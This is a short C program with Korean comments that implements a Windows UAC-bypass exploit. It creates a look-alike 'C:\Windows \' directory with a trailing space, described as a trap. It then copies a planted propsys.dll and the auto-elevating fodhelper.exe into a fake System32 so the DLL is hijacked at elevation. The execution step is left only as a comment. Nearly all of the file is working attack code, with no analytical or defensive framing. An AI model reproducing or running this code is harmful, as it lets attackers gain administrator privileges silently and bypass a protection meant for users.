#include <stdio.h>
#include <windows.h>
#include <direct.h>	


int main(int argc, char* argv[]) {

	//1. 디렉터리 생성 (함정)
	if (_mkdir("C:\\Windows \\") == 0) {
		printf("\nmkdir 1 success...\n");
		_mkdir("C:\\Windows \\system32\\");
	}
	else {
		printf("\nmkdir 1 false... %d \n", GetLastError());
		return 1;
	}



	//2. dll을 해당 디렉터리에 복사
	if (CopyFile("C:\\workspace\\propsys.dll", "C:\\Windows \\System32\\propsys.dll", false)!=0) {
		printf("\nCopyFile 1 success...\n");
	}
	else {
		printf("\nCopyFile 1 false... %d \n", GetLastError());
		return 1;
	}

	//3. autoElevate=true인 실행파일 함정디렉터리로 복사.
	if (CopyFile("C:\\Windows\\System32\\fodhelper.exe", "C:\\Windows \\System32\\fodhelper.exe", false)!=0) {
		printf("\nCopyFile 2 success...\n");
	}
	else {
		printf("\nCopyFile 2 false... %d \n", GetLastError());
		return 1;
	}
	printf("\n성공따리\n");


	//4. 함정 디렉터리 내에 있는 실행파일 실행.


	return 0;
}